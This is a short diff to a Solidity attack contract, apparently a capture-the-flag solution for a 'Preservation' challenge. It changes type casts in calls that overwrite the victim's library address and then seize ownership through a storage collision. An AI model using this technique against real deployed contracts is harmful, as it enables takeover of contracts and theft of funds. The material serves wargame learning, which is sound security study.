@@ -1,4 +1,4 @@
-contract Attacker {
+contract attacker {
 
   address public timeZone1Library;
   address public timeZone2Library;
@@ -7,8 +7,8 @@ contract Attacker {
 
   // 1st modify the timeZone1Library with our attacker contract address.
   function attack(Preservation _preservation) public {
-    _preservation.setFirstTime(uint160(address(this)));
-    _preservation.setFirstTime(uint160(hackerAddress));
+    _preservation.setFirstTime(uint256(uint160(address(this))));
+    _preservation.setFirstTime(uint256(uint160(hackerAddress)));
   }
 
   // 2nd call a function with the same name but storing the address you want to set as Owner. It will modify the third storage in the contract.
